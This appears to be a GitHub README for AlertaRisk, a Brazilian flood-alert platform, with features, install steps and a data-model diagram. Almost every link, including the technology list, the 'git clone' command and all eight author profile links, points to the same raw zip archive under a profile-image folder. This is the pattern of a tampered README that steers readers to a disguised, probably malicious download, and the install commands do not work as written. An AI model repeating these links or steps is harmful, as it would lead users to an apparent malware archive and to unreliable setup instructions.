# 🌧️ AlertaRisk – Plataforma de Prevenção a Alagamentos
🚨 Monitoramento de zonas de risco e alertas para prevenir catástrofes causadas pelas chuvas.

## 📌 Introdução
O AlertaRisk é uma plataforma desenvolvida para prever e alertar sobre possíveis alagamentos em áreas de risco. Com base no volume de chuvas e dados geográficos.

Nosso objetivo é reduzir danos e salvar vidas, garantindo que as pessoas saibam o que fazer antes, durante e depois de uma emergência.

## ⚙️ Funcionalidades
### 🖥️ Página Inicial
- ✔️ Cadastro de usuários em áreas de risco
- ✔️ Envio de alertas via WhatsApp e SMS
- ✔️ Medidas preventivas e orientações de segurança
- ✔️ Contatos de emergência: SAMU, Bombeiros, Defesa Civil e Polícia Militar de Pernambuco

### 📌 Módulos do Sistema
- ✅ Cadastro e Login → Criar conta, fazer login e recuperar senha
- ✅ Mapa Interativo → Exibição de zonas de risco e alertas ativos
- ✅ Alertas em Tempo Real → Notificações sobre chuvas fortes e alagamentos
- ✅ Orientações de Segurança → O que fazer antes, durante e depois de um evento extremo

## 🛠️ Tecnologias Utilizadas
### 🚀 Back-end:

- Java
- https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip

### 🎨 Front-end:

- HTML e CSS
- Javascript
- https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip

## Instalação

1. Clone o repositório:
```bash 
git clone https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip
```
2. Acesse a pasta do projeto:
```bash
cd AlertaRisk
```
3. Instale as dependências:
```bash
npm install AlertaRisk
```     
## Como usar

1. Inicie a aplicação:
```bash
npm start
```
2. Acesse o painel em: 
```bash
http://localhost:3006
```
3. Configure a área de monitoramento e visualize os alertas de risco.

## Modelagem de Dados

```mermaid
classDiagram
    class alertas {
        +id_alerta: PK
        +data_hora: datetime
    }

    class alerta_publicacao_status {
        +id_publicacao: PK, FK
        +id_alerta: PK, FK
    }

    class alerta_endereco_status {
        +id_alerta: PK, FK
        +id_endereco: PK, FK
    }

    class alerta_ativo {
        +id_usuario: PK, FK
        +id_alerta: PK, FK
    }

    class administrador {
        +id_adm: PK
        +nome: string
        +senha: string
        +cpf: string
        +crp: string
        +id_monitorar: FK
    }

    class endereco {
        +nome: string
        +cep: string
        +numero: string
        +id_endereco: PK
        +id_usuario: FK
    }

    class id_monitorar {
        +id_usuario: PK, FK
        +id_adm: PK, FK
        +id_publicacao: PK, FK
        +id_alerta: PK, FK
    }

    class usuario {
        +id_usuario: PK
        +nome: string
        +email: string
        +foto_perfil: string
        +cpf: string
    }

    class publicacoes {
        +id_publicacao: PK
        +comentario: string
        +data_hora: datetime
        +video: string
    }

    class publicacao_endereco_status {
        +nivel_de_alerta: string
        +id_publicacao: PK, FK
        +id_endereco: PK, FK
    }


    %% Definição dos relacionamentos
    alertas --> alerta_publicacao_status : "1,1 - 0,N"
    alertas --> alerta_endereco_status : "1,1 - 0,N"
    alertas --> alerta_ativo : "1,1 - 0,N"
    alertas --> id_monitorar : "1,1 - 0,N"

    usuario --> alerta_ativo : "1,1 - 0,N"
    usuario --> id_monitorar : "1,1 - 0,N"
    usuario --> endereco : "1,1 - 0,N"

    administrador --> id_monitorar : "1,1 - 0,N"

    endereco --> alerta_endereco_status : "1,1 - 0,N"
    endereco --> publicacao_endereco_status : "1,1 - 0,N"

    publicacoes --> alerta_publicacao_status : "1,1 - 0,N"
    publicacoes --> id_monitorar : "1,1 - 0,N"
    publicacoes --> publicacao_endereco_status : "1,1 - 0,N"
```

## Autores

Back-end:

- [Jorge Falcão](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
- [Luana Marques](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
- [Matheus Alves](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
- [Tarcilla Almeida](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
- [Victor Melo](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)

Front-end:

- [Cláudia Ribeiro](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
- [Gabriel Ferreira](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
- [Maria Gabriella](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
